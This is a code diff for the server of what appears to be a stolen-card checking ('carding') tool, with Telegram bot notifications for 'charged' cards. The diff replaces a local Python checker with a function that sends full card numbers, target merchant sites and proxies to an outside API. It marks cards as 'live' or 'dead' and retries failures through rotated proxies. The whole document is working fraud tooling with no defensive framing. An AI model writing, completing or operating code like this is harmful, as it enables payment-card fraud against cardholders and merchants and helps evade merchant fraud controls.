@@ -4,8 +4,7 @@ import { WebSocketServer, WebSocket } from "ws";
 import { storage } from "./storage";
 import { api } from "@shared/routes";
 import { WS_EVENTS, ADMIN_TELEGRAM_ID } from "@shared/schema";
-import { spawn } from "child_process";
-import path from "path";
+const CHECK_API_URL = process.env.CHECK_API_URL || 'https://apicleen-production-d7b1.up.railway.app/api/check';
 import jwt from "jsonwebtoken";
 import { telegramService } from "./services/telegram";
 import { handleBotUpdate, initBot, sendChargedCardNotification } from "./services/telegramBot";
@@ -132,7 +131,6 @@ export async function registerRoutes(
     isRunning: boolean;
     shouldStop: boolean;
     sessionId: string | null;
-    processes: Set<ReturnType<typeof spawn>>;
     processed: number;
     total: number;
     charged: number;
@@ -147,7 +145,6 @@ export async function registerRoutes(
         isRunning: false,
         shouldStop: false,
         sessionId: null,
-        processes: new Set(),
         processed: 0,
         total: 0,
         charged: 0,
@@ -161,20 +158,6 @@ export async function registerRoutes(
     const job = getUserJob(userId);
     job.shouldStop = true;
     job.isRunning = false;
-    
-    // Kill all processes with SIGKILL for immediate termination
-    job.processes.forEach(proc => {
-      try {
-        proc.kill('SIGTERM');
-        // Force kill after 1 second if still running
-        setTimeout(() => {
-          try {
-            proc.kill('SIGKILL');
-          } catch (e) {}
-        }, 1000);
-      } catch (e) {}
-    });
-    job.processes.clear();
     job.sessionId = null;
     job.processed = 0;
     job.total = 0;
@@ -182,81 +165,46 @@ export async function registerRoutes(
     job.rejected = 0;
   };
 
-  const checkCardWithPython = (card: string, siteUrl: string, proxy: string, userId: number, onLog: (msg: string) => void): Promise<{status: string, message: string, price?: string}> => {
-    return new Promise((resolve) => {
-      const job = getUserJob(userId);
-      
-      if (job.shouldStop) {
-        resolve({ status: 'error', message: '[STOPPED] Cancelled by user' });
-        return;
+  const checkCardWithAPI = async (card: string, siteUrl: string, proxy: string, onLog: (msg: string) => void): Promise<{status: string, message: string, price?: string, gateway?: string}> => {
+    const cardPrefix = card.substring(0, 6);
+    onLog(`Checking card ${cardPrefix}...`);
+
+    let url = `${CHECK_API_URL}?cc=${encodeURIComponent(card)}&site=${encodeURIComponent(siteUrl)}`;
+    if (proxy && proxy.trim().length > 0) {
+      url += `&proxy=${encodeURIComponent(proxy.trim())}`;
+    }
+
+    try {
+      const response = await fetch(url, {
+        signal: AbortSignal.timeout(120000),
+      });
+
+      if (!response.ok) {
+        return { status: 'error', message: 'API Error' };
       }
 
-      const scriptPath = path.join(process.cwd(), 'server', 'python', 'checker.py');
-      
-      const pythonProcess = spawn('python', [scriptPath, card, siteUrl, proxy], {
-        timeout: 90000
-      });
-      
-      job.processes.add(pythonProcess);
-      
-      let stdout = '';
-      
-      pythonProcess.stdout.on('data', (data) => {
-        stdout += data.toString();
-      });
-      
-      pythonProcess.stderr.on('data', (data) => {
-        const logLines = data.toString().trim().split('\n');
-        for (const line of logLines) {
-          if (line.startsWith('[LOG]')) {
-            onLog(line.replace('[LOG] ', ''));
-          }
-        }
-      });
-      
-      pythonProcess.on('close', (code) => {
-        job.processes.delete(pythonProcess);
-        
-        if (job.shouldStop) {
-          resolve({ status: 'error', message: '[STOPPED] Cancelled by user' });
-          return;
-        }
-        
-        try {
-          // Handle empty output
-          if (!stdout.trim()) {
-            resolve({ status: 'error', message: 'Invalid Response' });
-            return;
-          }
-          
-          const lines = stdout.trim().split('\n');
-          // Find the last valid JSON line (search from end)
-          for (let i = lines.length - 1; i >= 0; i--) {
-            const line = lines[i].trim();
-            if (line.startsWith('{') && line.endsWith('}')) {
-              try {
-                const result = JSON.parse(line);
-                if (result.status && result.message) {
-                  resolve(result);
-                  return;
-                }
-              } catch (parseErr) {
-                // Try next line
-              }
-            }
-          }
-          // No valid JSON found
-          resolve({ status: 'error', message: 'Invalid Response' });
-        } catch (e) {
-          resolve({ status: 'error', message: 'Invalid Response' });
-        }
-      });
-      
-      pythonProcess.on('error', (err) => {
-        job.processes.delete(pythonProcess);
-        resolve({ status: 'error', message: 'Invalid Response' });
-      });
-    });
+      const data = await response.json() as any;
+
+      const apiStatus = (data.Status || '').toLowerCase();
+      const apiResponse = data.Response || data.Status || 'Unknown';
+
+      let status = 'dead';
+      if (apiStatus === 'approved' || apiStatus === 'live') {
+        status = 'live';
+      }
+
+      return {
+        status,
+        message: apiResponse,
+        price: data.Price,
+        gateway: data.Gateway,
+      };
+    } catch (e: any) {
+      if (e.name === 'AbortError' || e.name === 'TimeoutError') {
+        return { status: 'error', message: 'Timeout' };
+      }
+      return { status: 'error', message: e.message || 'API Error' };
+    }
   };
 
   const getBatchSize = (totalCards: number) => Math.max(1, Math.ceil(totalCards / 2));
@@ -366,25 +314,24 @@ export async function registerRoutes(
           return { success: true, stopped: false, charged: false };
         }
 
-        // Process valid card with checker
+        // Process valid card with API
         try {
-          const onLog = (msg: string) => {
+          let result = await checkCardWithAPI(cardStr, targetUrl, currentProxy, (msg) => {
             if (job.shouldStop) return;
-            const cardPrefix = cardStr.substring(0, 6);
-            broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: `[${cardPrefix}] ${msg}`, type: 'info' } });
-          };
+            broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: `[${cardStr.substring(0, 6)}] ${msg}`, type: 'info' } });
+          });
           
-          let result = await checkCardWithPython(cardStr, targetUrl, currentProxy, userId, onLog);
-          
-          // Retry once if Invalid Response (use different proxy if available)
-          if (result.message === 'Invalid Response' && !job.shouldStop) {
+          // Retry once if error (use different proxy if available)
+          if (result.status === 'error' && !job.shouldStop) {
             const retryProxyIndex = (proxyIndex + 1) % (proxies.length || 1);
             const retryProxy = proxies[retryProxyIndex] || currentProxy;
-            broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: `[${cardStr.substring(0, 6)}] Invalid Response - Retrying with new proxy...`, type: 'info' } });
+            broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: `[${cardStr.substring(0, 6)}] Error - Retrying with new proxy...`, type: 'info' } });
             
-            // Wait 2 seconds before retry to let proxy/site settle
             await new Promise(r => setTimeout(r, 2000));
-            result = await checkCardWithPython(cardStr, targetUrl, retryProxy, userId, onLog);
+            result = await checkCardWithAPI(cardStr, targetUrl, retryProxy, (msg) => {
+              if (job.shouldStop) return;
+              broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: `[${cardStr.substring(0, 6)}] ${msg}`, type: 'info' } });
+            });
           }
           
           if (job.shouldStop || result.message?.includes('[STOPPED]')) {
